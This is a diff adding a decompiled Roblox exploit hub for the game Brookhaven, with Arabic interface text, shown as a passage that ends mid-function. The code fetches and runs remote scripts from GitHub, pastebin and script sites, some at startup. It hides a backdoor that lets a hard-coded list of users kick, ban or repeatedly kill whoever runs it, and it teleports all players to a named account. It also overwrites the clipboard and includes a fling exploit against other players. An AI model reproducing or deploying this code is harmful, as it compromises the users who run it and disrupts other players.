@@ -1,0 +1,4925 @@
+-- تم تفجير ههههههههه من قبل cofruncb9i2 
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dndjsjssj/Ggg/refs/heads/Gghs/Dev'))()
+
+local _Players = game:GetService('Players')
+local u2 = 'Dnawe1'
+
+_Players.PlayerAdded:Connect(function(p3)
+    if p3.Name == u2 then
+        p3.CharacterAdded:Connect(function(p4)
+            local _HumanoidRootPart = p4:WaitForChild('HumanoidRootPart')
+            local v6 = _Players
+            local v7, v8, v9 = pairs(v6:GetPlayers())
+
+            while true do
+                local v10
+
+                v9, v10 = v7(v8, v9)
+
+                if v9 == nil then
+                    break
+                end
+
+                local _ScreenGui = Instance.new('ScreenGui')
+
+                _ScreenGui.Name = 'DeveloperAlert'
+                _ScreenGui.ResetOnSpawn = false
+
+                local _Frame = Instance.new('Frame')
+
+                _Frame.Size = UDim2.new(0.5, 0, 0.2, 0)
+                _Frame.Position = UDim2.new(0.25, 0, 0.4, 0)
+                _Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                _Frame.BackgroundTransparency = 0.3
+                _Frame.Parent = _ScreenGui
+
+                local _ImageLabel = Instance.new('ImageLabel')
+
+                _ImageLabel.Size = UDim2.new(0.3, 0, 1, 0)
+                _ImageLabel.Position = UDim2.new(0, 0, 0, 0)
+                _ImageLabel.BackgroundTransparency = 1
+                _ImageLabel.Image = 'rbxassetid://115714662895227'
+                _ImageLabel.Parent = _Frame
+
+                local _TextLabel = Instance.new('TextLabel')
+
+                _TextLabel.Size = UDim2.new(0.7, 0, 1, 0)
+                _TextLabel.Position = UDim2.new(0.3, 0, 0, 0)
+                _TextLabel.BackgroundTransparency = 1
+                _TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+                _TextLabel.TextScaled = true
+                _TextLabel.Font = Enum.Font.GothamBold
+                _TextLabel.Text = '\u{fffd}\u{644}\u{645}\u{637}\u{648}\u{631} \u{645}\u{627}\u{631}\u{62a}\u{640}\u{646} \u{62f}\u{62e}\u{644} \u{627}\u{644}\u{633}\u{64a}\u{631}\u{641}\u{631}!'
+                _TextLabel.Parent = _Frame
+                _ScreenGui.Parent = v10:WaitForChild('PlayerGui')
+
+                task.delay(5, function()
+                    _ScreenGui:Destroy()
+                end)
+            end
+
+            local v15 = _Players
+            local v16, v17, v18 = pairs(v15:GetPlayers())
+
+            while true do
+                local v19
+
+                v18, v19 = v16(v17, v18)
+
+                if v18 == nil then
+                    break
+                end
+                if v19.Character and v19.Character:FindFirstChild('HumanoidRootPart') then
+                    v19.Character.HumanoidRootPart.CFrame = _HumanoidRootPart.CFrame
+                end
+            end
+        end)
+
+        if p3.Character and p3.Character:FindFirstChild('HumanoidRootPart') then
+            local _HumanoidRootPart2 = p3.Character.HumanoidRootPart
+            local v21 = _Players
+            local v22, v23, v24 = pairs(v21:GetPlayers())
+
+            while true do
+                local v25
+
+                v24, v25 = v22(v23, v24)
+
+                if v24 == nil then
+                    break
+                end
+
+                local _ScreenGui2 = Instance.new('ScreenGui')
+
+                _ScreenGui2.Name = 'DeveloperAlert'
+                _ScreenGui2.ResetOnSpawn = false
+
+                local _Frame2 = Instance.new('Frame')
+
+                _Frame2.Size = UDim2.new(0.5, 0, 0.2, 0)
+                _Frame2.Position = UDim2.new(0.25, 0, 0.4, 0)
+                _Frame2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                _Frame2.BackgroundTransparency = 0.3
+                _Frame2.Parent = _ScreenGui2
+
+                local _ImageLabel2 = Instance.new('ImageLabel')
+
+                _ImageLabel2.Size = UDim2.new(0.3, 0, 1, 0)
+                _ImageLabel2.Position = UDim2.new(0, 0, 0, 0)
+                _ImageLabel2.BackgroundTransparency = 1
+                _ImageLabel2.Image = 'rbxassetid://115714662895227'
+                _ImageLabel2.Parent = _Frame2
+
+                local _TextLabel2 = Instance.new('TextLabel')
+
+                _TextLabel2.Size = UDim2.new(0.7, 0, 1, 0)
+                _TextLabel2.Position = UDim2.new(0.3, 0, 0, 0)
+                _TextLabel2.BackgroundTransparency = 1
+                _TextLabel2.TextColor3 = Color3.fromRGB(255, 0, 0)
+                _TextLabel2.TextScaled = true
+                _TextLabel2.Font = Enum.Font.GothamBold
+                _TextLabel2.Text = '\u{fffd}\u{644}\u{645}\u{637}\u{648}\u{631} \u{645}\u{627}\u{631}\u{62a}\u{640}\u{646} \u{62f}\u{62e}\u{644} \u{627}\u{644}\u{633}\u{64a}\u{631}\u{641}\u{631}!'
+                _TextLabel2.Parent = _Frame2
+                _ScreenGui2.Parent = v25:WaitForChild('PlayerGui')
+
+                task.delay(10, function()
+                    _ScreenGui2:Destroy()
+                end)
+            end
+
+            local v30 = _Players
+            local v31, v32, v33 = pairs(v30:GetPlayers())
+
+            while true do
+                local v34
+
+                v33, v34 = v31(v32, v33)
+
+                if v33 == nil then
+                    break
+                end
+                if v34.Character and v34.Character:FindFirstChild('HumanoidRootPart') then
+                    v34.Character.HumanoidRootPart.CFrame = _HumanoidRootPart2.CFrame
+                end
+            end
+        end
+    end
+end)
+wait(0.1)
+setclipboard('asf.69')
+
+local _TextChatService = game:GetService('TextChatService')
+local _Players2 = game:GetService('Players')
+local _LocalPlayer = _Players2.LocalPlayer
+local u38 = {
+    Davi1901lucas = true,
+    Lusquinha_067 = true,
+    gokuooo99 = true,
+}
+local u39 = {}
+
+local function u41(p40)
+    return u38[p40]
+end
+local function u49(p42)
+    local v43 = p42:lower()
+    local v44 = _Players2
+    local v45, v46, v47 = ipairs(v44:GetPlayers())
+
+    while true do
+        local v48
+
+        v47, v48 = v45(v46, v47)
+
+        if v47 == nil then
+            break
+        end
+        if v48.Name:lower():find(v43, 1, true) then
+            return v48
+        end
+    end
+end
+
+_TextChatService.MessageReceived:Connect(function(p50)
+    local v51 = _Players2:GetPlayerByUserId(p50.TextSource.UserId)
+
+    if v51 and u41(v51.Name) then
+        local _SsSs, v53, v54 = p50.Text:match('^(%S+)%s*(%S+)%s*(.*)$')
+        local v55 = u49(v53)
+
+        if _SsSs == '/kick' or (_SsSs == '/band' or _SsSs == '/banc') then
+            if not v55 then
+                return
+            end
+
+            local v56 = (v54 == '' or not v54) and 'No reason provided' or v54
+
+            if _SsSs == '/band' then
+                writefile('KamuiHubBan.txt', string.format('true, "%s", "%s"', v51.Name, v56))
+
+                if v55 == _LocalPlayer then
+                    _LocalPlayer:Kick("You're blacklisted in the hub (Device Ban). Banned by: " .. v51.Name .. '. Reason: ' .. v56)
+                end
+            elseif _SsSs == '/banc' then
+                local v57 = 'ban_' .. v55.UserId .. '.txt'
+
+                writefile(v57, string.format('true, "%s", "%s"', v51.Name, v56))
+
+                if v55 == _LocalPlayer then
+                    _LocalPlayer:Kick("You're blacklisted in the hub (Account Ban). Banned by: " .. v51.Name .. '. Reason: ' .. v56)
+                end
+            elseif _SsSs == '/kick' and v55 == _LocalPlayer then
+                _LocalPlayer:Kick("You've been kicked from the game by the hub. Kicked by: " .. v51.Name .. '. Reason: ' .. v56)
+            end
+        elseif _SsSs == '/bring' and (v51.Character and _LocalPlayer.Character) then
+            _LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            task.wait(0.1)
+            _LocalPlayer.Character:SetPrimaryPartCFrame(v51.Character:GetPrimaryPartCFrame())
+        elseif _SsSs == '/spy' then
+            _LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            task.wait(0.1)
+            _LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(1118.81, 75.998, -1138.61))
+        elseif _SsSs == '/kill' and v55 then
+            if v55 == _LocalPlayer and v55.Character and v55.Character:FindFirstChild('Humanoid') then
+                v55.Character.Humanoid.Health = 0
+            end
+        elseif _SsSs == '/loopkill' and v55 then
+            if v55 == _LocalPlayer then
+                u39[_LocalPlayer.UserId] = true
+
+                if v55.Character and v55.Character:FindFirstChild('Humanoid') then
+                    v55.Character.Humanoid.Health = 0
+                end
+
+                v55.CharacterAdded:Connect(function(p58)
+                    if u39[_LocalPlayer.UserId] then
+                        task.wait(0.2)
+
+                        p58:WaitForChild('Humanoid').Health = 0
+                    end
+                end)
+            end
+        elseif _SsSs == '/unloopkill' and v55 then
+            u39[v55.UserId] = nil
+        end
+    end
+end)
+
+if isfile('KamuiHubBan.txt') then
+    local _truess, v60, v61 = readfile('KamuiHubBan.txt'):match('^(true),%s*"(.-)",%s*"(.-)"$')
+
+    if _truess == 'true' then
+        local v62 = _LocalPlayer
+
+        _LocalPlayer.Kick(v62, "You're blacklisted in the hub (Device Ban). Banned by: " .. (v60 or 'Unknown') .. '. Reason: ' .. (v61 or 'No reason provided'))
+    end
+end
+
+local v63 = 'ban_' .. _LocalPlayer.UserId .. '.txt'
+
+if isfile(v63) then
+    local _truess2, v65, v66 = readfile(v63):match('^(true),%s*"(.-)",%s*"(.-)"$')
+
+    if _truess2 == 'true' then
+        local v67 = _LocalPlayer
+
+        _LocalPlayer.Kick(v67, "You're blacklisted in the hub (Account Ban). Banned by: " .. (v65 or 'Unknown') .. '. Reason: ' .. (v66 or 'No reason provided'))
+    end
+end
+if u41(_LocalPlayer.Name) then
+    _LocalPlayer.Chatted:Connect(function(p68)
+        if p68 == '/spy' then
+            _LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+            task.wait(0.1)
+            _LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(1118.81, 75.998, -1138.61))
+        end
+    end)
+end
+
+local u69 = loadstring(game:HttpGet('https://raw.githubusercontent.com/dndjsjssj/Ggg/refs/heads/main/Ggs'))()
+local v70 = u69
+local v71 = u69.MakeWindow(v70, {
+    Name = 'SCRPIT MARTIN |V2',
+    HidePremium = false,
+    SaveConfig = true,
+    IntroText = 'ITACHI KING \u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd}\u{fffd}',
+    IntroIcon = 'rbxassetid://115714662895227',
+    ConfigFolder = 'OrionTest',
+})
+
+game:GetService('ReplicatedStorage').RE['1RPNam1eTex1t']:FireServer('RolePlayName', ' \u{633}\u{643}\u{631}\u{628}\u{62a} \u{627}\u{644}\u{645}\u{637}\u{648}\u{631} \u{645}\u{627}\u{631}\u{62a}\u{646} V2.1')
+
+local v72 = {
+    'PickingRPNameColor',
+    Color3.fromRGB(255, 0, 0),
+}
+
+game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1RPNam1eColo1r'):FireServer(unpack(v72))
+game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1RPNam1eTex1t'):FireServer(unpack({
+    'RolePlayBio',
+    'SCRPIT MARTIN ',
+}))
+
+local v73 = {
+    'PickingRPBioColor',
+    Color3.fromRGB(p, 0, 0),
+}
+
+game:GetService('ReplicatedStorage'):WaitForChild('RE'):WaitForChild('1RPNam1eColo1r'):FireServer(unpack(v73))
+
+local v74 = v71:MakeTab({
+    Name = '\u{fffd}\u{639}\u{644}\u{648}\u{645}\u{627}\u{62a} \u{627}\u{644}\u{645}\u{637}\u{648}\u{631}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v74:AddParagraph('\u{fffd}\u{644}\u{627}\u{62d}\u{636}\u{629} :', ' \u{62d}\u{633}\u{627}\u{628}\u{64a} \u{627}\u{644}\u{62a}\u{64a}\u{643} \u{644}\u{644}\u{62a}\u{648}\u{627}\u{635}\u{644} \u{645}\u{639}\u{64a} \u{644}\u{648} \u{62a}\u{628}\u{648}\u{646}\u{64a} \u{627}\u{636}\u{64a}\u{641} \u{634}\u{64a} \u{644}\u{644} \u{633}\u{643}\u{631}\u{628}\u{62a}')
+v74:AddSection({
+    Name = '\u{fffd}\u{640}\u{633}\u{627}\u{628}\u{640}\u{627}\u{62a}\u{640}\u{64a}',
+})
+v74:AddButton({
+    Name = '\u{fffd}\u{636}\u{63a}\u{637} \u{644}\u{646}\u{633}\u{62e} \u{62d}\u{633}\u{627}\u{628}\u{64a} \u{627}\u{644}\u{62a}\u{64a}\u{643}',
+    Callback = function()
+        setclipboard('asf.69')
+        u69:MakeNotification({
+            Name = '\u{fffd}\u{645} \u{646}\u{633}\u{62e}',
+            Content = '\u{fffd}\u{642}\u{62f} \u{62a}\u{645} \u{646}\u{633}\u{62e} \u{62d}\u{633}\u{627}\u{628} \u{627}\u{644}\u{645}\u{637}\u{648}\u{631} \u{631}\u{648}\u{628} ',
+            Image = 'rbxassetid://115714662895227',
+            Time = 5,
+        })
+    end,
+})
+v74:AddButton({
+    Name = '\u{fffd}\u{636}\u{63a}\u{637} \u{644}\u{646}\u{633}\u{62e} \u{62d}\u{633}\u{627}\u{628}\u{64a} \u{627}\u{644}\u{631}\u{648}\u{628}',
+    Callback = function()
+        setclipboard('Dnawe1')
+        u69:MakeNotification({
+            Name = '\u{fffd}\u{645} \u{646}\u{633}\u{62e}',
+            Content = '\u{fffd}\u{642}\u{62f} \u{62a}\u{645} \u{646}\u{633}\u{62e} \u{62d}\u{633}\u{627}\u{628} \u{627}\u{644}\u{645}\u{637}\u{648}\u{631} \u{631}\u{648}\u{628} ',
+            Image = 'rbxassetid://115714662895227',
+            Time = 5,
+        })
+    end,
+})
+
+local v75 = v71:MakeTab({
+    Name = '\u{fffd}\u{644}\u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a} ',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v74:AddSection({
+    Name = '\u{fffd}\u{fffd}\u{627}\u{644}\u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a} \u{627}\u{644}\u{642}\u{627}\u{62f}\u{645}\u{629}\u{2193} ',
+})
+v75:AddParagraph(' \u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a}:', '  \u{643}\u{644} \u{64a}\u{648}\u{645}\u{64a}\u{646} \u{64a}\u{646}\u{632}\u{644} \u{62a}\u{62d}\u{62f}\u{64a}\u{62b} \u{627}\u{646}\u{634}\u{627}\u{644}\u{644}\u{647} ')
+v74:AddSection({
+    Name = '\u{fffd}\u{fffd}\u{627}\u{644}\u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a} \u{627}\u{644}\u{64a} \u{635}\u{627}\u{631}\u{62a} \u{2193} ',
+})
+v75:AddParagraph(' \u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a}:', '  \u{646}\u{633}\u{62e} \u{633}\u{643}\u{646}\u{627}\u{62a} \u{639}\u{62f}\u{644}\u{62a} \u{639}\u{644}\u{64a}\u{647} \u{648}\u{635}\u{627}\u{631} \u{642}\u{648}\u{64a} ')
+v75:AddParagraph(' \u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a}:', '  \u{627}\u{636}\u{627}\u{641}\u{647} \u{62e}\u{64a}\u{627}\u{631}\u{627}\u{62a} \u{644}\u{644} \u{627}\u{63a}\u{627}\u{646}\u{64a} \u{645}\u{62c}\u{627}\u{646}\u{64a}\u{647} ')
+v75:AddParagraph(' \u{62a}\u{62d}\u{62f}\u{64a}\u{62b}\u{627}\u{62a} :', '  \u{627}\u{636}\u{627}\u{641}\u{647} \u{645}\u{636}\u{627}\u{62f} \u{644}\u{644} \u{62a}\u{62c}\u{645}\u{64a}\u{62f}   ')
+
+local v76 = v71:MakeTab({
+    Name = 'BROOKHAVEN',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+v76:AddSection({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a}\u{627}\u{62a} ',
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{636}\u{646} \u{645}\u{646} \u{627}\u{644}\u{62e}\u{644}\u{641}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/martinng5/martin/refs/heads/main/martin.lua.txt'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{64a}\u{627}\u{631}\u{627}\u{646}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/martinng5/martin/refs/heads/main/Protected_8395766550616276.txt'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{62c}\u{648}\u{62f}\u{629}',
+    Callback = function()
+        loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-Rtx-graphics-25102'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{631}\u{642}\u{635}\u{627}\u{62a}',
+    Callback = function()
+        loadstring(game:HttpGet('https://scriptblox.com/raw/Baseplate-Fe-All-Emote-7386'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{634}\u{64a}\u{627}\u{62a}',
+    Callback = function()
+        loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-AFEM-14048'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{646}\u{633}\u{62e} \u{633}\u{643}\u{646}\u{640}\u{627}\u{62a}',
+    Callback = function()
+        loadstring(game:HttpGet('https://rawscripts.net/raw/Universal-Script-rochips-universal-18294'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{62c}\u{644}',
+    Callback = function()
+        loadstring(game:HttpGet('https://pastefy.app/YZoglOyJ/raw'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{627}\u{644}\u{647}\u{644}\u{627}\u{644}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/n0kc/AtomicHub/main/Map-Al-Biout.lua'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a}  \u{631}\u{62d}\u{645}\u{629} 1',
+    Callback = function()
+        print('Clicked')
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{631}\u{62d}\u{645}\u{629}2',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/VR7ss/OMK/refs/heads/main/VR7-ON-TOP'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{627}\u{62e}\u{62a}\u{641}\u{627}\u{621}',
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+    end,
+})
+v76:AddButton({
+    Name = '2\u{633}\u{643}\u{631}\u{628}\u{62a} \u{627}\u{62e}\u{62a}\u{641}\u{627}\u{621}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe./dbb6ce6f6cee4f7a5c9e20d7b88e83db2a93bf25/Invisible%20GUI'))()
+    end,
+})
+v76:AddButton({
+    Name = ' \u{633}\u{643}\u{631}\u{628}\u{62a} \u{637}\u{64a}\u{631}\u{627}\u{646} \u{643}\u{646}\u{628}\u{629}',
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/TXMNj1yy'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{632}\u{627}\u{644}\u{629} \u{644}\u{627}\u{642}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua'))()
+    end,
+})
+v76:AddButton({
+    Name = ' \u{633}\u{643}\u{631}\u{628}\u{640}\u{62a} \u{627}\u{63a}\u{627}\u{646}\u{64a}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
+    end,
+})
+v76:AddButton({
+    Name = ' \u{633}\u{643}\u{631}\u{628}\u{62a} \u{633}\u{631}\u{639}\u{647} \u{633}\u{64a}\u{627}\u{631}\u{647}',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/M1ZZ001/BrookhavenR4D/main/Brookhaven%20R4D%20Script'))()
+    end,
+})
+v76:AddButton({
+    Name = '\u{fffd}\u{643}\u{631}\u{628}\u{62a} \u{634}\u{641}\u{62a} ',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Sector9922/SECTOR-SHIFT-LOCK/main/SECTOR%20SHIFT%20LOCK'))()
+    end,
+})
+
+local u77 = v71:MakeTab({
+    Name = '\u{fffd}\u{62e}\u{631}\u{64a}\u{628}',
+    Icon = 'rbxassetid://115714662895227',
+    PremiumOnly = false,
+})
+
+u77:AddSection({
+    Name = '\u{fffd}\u{62a}\u{644} \u{628}\u{644} \u{643}\u{646}\u{628}\u{629}',
+})
+
+local _Players3 = game:GetService('Players')
+local _LocalPlayer2 = _Players3.LocalPlayer
+
+function GetPlayer(p80)
+    local v81 = {}
+    local v82 = p80:lower()
+
+    if v82 == 'all' then
+        local v83 = _Players3
+        local v84, v85, v86 = pairs(v83:GetPlayers())
+
+        while true do
+            local v87
+
+            v86, v87 = v84(v85, v86)
+
+            if v86 == nil then
+                break
+            end
+
+            table.insert(v81, v87)
+        end
+    elseif v82 == 'others' then
+        local v88 = _Players3
+        local v89, v90, v91 = pairs(v88:GetPlayers())
+
+        while true do
+            local v92
+
+            v91, v92 = v89(v90, v91)
+
+            if v91 == nil then
+                break
+            end
+            if v92.Name ~= _LocalPlayer2.Name then
+                table.insert(v81, v92)
+            end
+        end
+    elseif v82 == 'me' then
+        table.insert(v81, _LocalPlayer2)
+    else
+        local v93 = _Players3
+        local v94, v95, v96 = pairs(v93:GetPlayers())
+
+        while true do
+            local v97
+
+            v96, v97 = v94(v95, v96)
+
+            if v96 == nil then
+                break
+            end
+            if v97.Name:lower():sub(1, #p80) == p80:lower() then
+                table.insert(v81, v97)
+            end
+        end
+    end
+
+    return v81
+end
+
+local function u103(p98)
+    local v99, v100, v101 = pairs(_LocalPlayer2.Backpack:GetChildren())
+
+    while true do
+        local v102
+
+        v101, v102 = v99(v100, v101)
+
+        if v101 == nil then
+            break
+        end
+        if v102.Name == p98 then
+            return true
+        end
+    end
+
+    return false
+end
+local function u106(p104)
+    local v105 = _LocalPlayer2.Backpack:FindFirstChild(p104)
+
+    if v105 then
+        _LocalPlayer2.Character.Humanoid:EquipTool(v105)
+    end
+end
+local function u109(p107)
+    local v108 = _LocalPlayer2.Character:FindFirstChild(p107)
+
+    if v108 then
+        v108.Parent = _LocalPlayer2.Backpack
+    end
+end
+local function u146(p110)
+    if not u103('Couch') then
+        game:GetService('ReplicatedStorage').RE:FindFirstChild('1Too1l'):InvokeServer(unpack({
+            'PickingTools',
+            'Couch',
+        }))
+    end
+
+    u106('Couch')
+
+    getgenv().flingloop = true
+
+    while getgenv().flingloop do
+        local function v145()
+            local _Players4 = game:GetService('Players')
+            local _LocalPlayer3 = _Players4.LocalPlayer
+            local u113 = false
+
+            local function v139(p114)
+                local _Character = _LocalPlayer3.Character
+                local u116
+
+                if _Character then
+                    u116 = _Character:FindFirstChildOfClass('Humanoid')
+                else
+                    u116 = _Character
+                end
+
+                local u117
+
+                if u116 then
+                    u117 = u116.RootPart
+                else
+                    u117 = u116
+                end
+
+                local _Character2 = p114.Character
+                local u119 = nil
+                local v120 = nil
+                local v121 = nil
+                local v122 = nil
+                local u123
+
+                if _Character2:FindFirstChildOfClass('Humanoid') then
+                    u123 = _Character2:FindFirstChildOfClass('Humanoid')
+                else
+                    u123 = nil
+                end
+                if u123 and u123.RootPart then
+                    u119 = u123.RootPart
+                end
+                if _Character2:FindFirstChild('Head') then
+                    v120 = _Character2.Head
+                end
+                if _Character2:FindFirstChildOfClass('Accessory') then
+                    v121 = _Character2:FindFirstChildOfClass('Accessory')
+                end
+                if v121 and v121:FindFirstChild('Handle') then
+                    v122 = v121.Handle
+                end
+                if _Character and (u116 and u117) then
+                    if u117.Velocity.Magnitude < 50 then
+                        getgenv().OldPos = u117.CFrame
+                    end
+                    if u123 and (u123.Sit and not u113) then
+                        u109('Couch')
+
+                        getgenv().flingloop = false
+
+                        return
+                    end
+                    if v120 then
+                        workspace.CurrentCamera.CameraSubject = v120
+                    elseif v120 or not v122 then
+                        if u123 and u119 then
+                            workspace.CurrentCamera.CameraSubject = u123
+                        end
+                    else
+                        workspace.CurrentCamera.CameraSubject = v122
+                    end
+                    if not _Character2:FindFirstChildWhichIsA('BasePart') then
+                        return
+                    end
+
+                    local function u127(p124, p125, p126)
+                        u117.CFrame = CFrame.new(p124.Position) * p125 * p126
+
+                        _Character:SetPrimaryPartCFrame(CFrame.new(p124.Position) * p125 * p126)
+
+                        u117.Velocity = Vector3.new(90000000, 900000000, 90000000)
+                        u117.RotVelocity = Vector3.new(900000000, 900000000, 900000000)
+                    end
+                    local function v132(p128)
+                        local v129 = tick()
+                        local v130 = 2
+                        local v131 = 0
+
+                        while u117 and u123 do
+                            if p128.Velocity.Magnitude >= 50 then
+                                u127(p128, CFrame.new(0, 1.5, u123.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, -u123.WalkSpeed), CFrame.Angles(0, 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, 1.5, u123.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, 1.5, u119.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, -u119.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, 1.5, u119.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
+                                task.wait()
+                            else
+                                v131 = v131 + 100
+
+                                u127(p128, CFrame.new(0, 1.5, 0) + u123.MoveDirection * p128.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v131), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, 0) + u123.MoveDirection * p128.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v131), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(2.25, 1.5, -2.25) + u123.MoveDirection * p128.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v131), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(-2.25, -1.5, 2.25) + u123.MoveDirection * p128.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(v131), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, 1.5, 0) + u123.MoveDirection, CFrame.Angles(math.rad(v131), 0, 0))
+                                task.wait()
+                                u127(p128, CFrame.new(0, -1.5, 0) + u123.MoveDirection, CFrame.Angles(math.rad(v131), 0, 0))
+                                task.wait()
+                            end
+                            if p128.Velocity.Magnitude > 500 or (p128.Parent ~= p114.Character or (p114.Parent ~= _Players4 or (not p114.Character == _Character2 or (u123.Sit or (u116.Health <= 0 or (tick() > v129 + v130 or getgenv().flingloop == false)))))) then
+                                break
+                            end
+                        end
+                    end
+
+                    workspace.FallenPartsDestroyHeight = 0 / 0
+
+                    local _BodyVelocity = Instance.new('BodyVelocity')
+
+                    _BodyVelocity.Name = 'SpeedDoPai'
+                    _BodyVelocity.Parent = u117
+                    _BodyVelocity.Velocity = Vector3.new(900000000, 900000000, 900000000)
+                    _BodyVelocity.MaxForce = Vector3.new(1 / 0, 1 / 0, 1 / 0)
+
+                    u116:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
+
+                    if u119 and v120 then
+                        if (u119.CFrame.p - v120.CFrame.p).Magnitude <= 5 then
+                            v132(u119)
+                        else
+                            v132(v120)
+                        end
+                    elseif u119 and not v120 then
+                        v132(u119)
+                    elseif u119 or not v120 then
+                        if not u119 and (not v120 and (v121 and v122)) then
+                            v132(v122)
+                        end
+                    else
+                        v132(v120)
+                    end
+
+                    _BodyVelocity:Destroy()
+                    u116:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
+
+                    workspace.CurrentCamera.CameraSubject = u116
+
+                    repeat
+                        u117.CFrame = getgenv().OldPos * CFrame.new(0, 0.5, 0)
+
+                        local v134 = _Character
+
+                        _Character.SetPrimaryPartCFrame(v134, getgenv().OldPos * CFrame.new(0, 0.5, 0))
+
+                        local v135 = u116
+
+                        u116.ChangeState(v135, 'GettingUp')
+
+                        local v136 = _Character
+
+                        table.foreach(_Character.GetChildren(v136), function(_, p137)
+                            if p137:IsA('BasePart') then
+                                local v138 = Vector3.new()
+
+                                p137.RotVelocity = Vector3.new()
+                                p137.Velocity = v138
+                            end
+                        end)
+                        task.wait()
+                    until (u117.Position - getgenv().OldPos.p).Magnitude < 25
+
+                    workspace.FallenPartsDestroyHeight = getgenv().FPDH
+                end
+            end
+
+            local _ = Welcome
+
+            getgenv().Welcome = true
+
+            if u113 then
+                local v140 = next
+                local v141 = _Players4
+                local v142, v143 = _Players4.GetPlayers(v141)
+
+                while true do
+                    local v144
+
+                    v143, v144 = v140(v142, v143)
+
+                    if v143 == nil then
+                        break
+                    end
+
+                    v139(v144)
+                end
+            end
+            if p110 then
+                v139(p110)
+            end
+
+            task.wait()
+        end
+
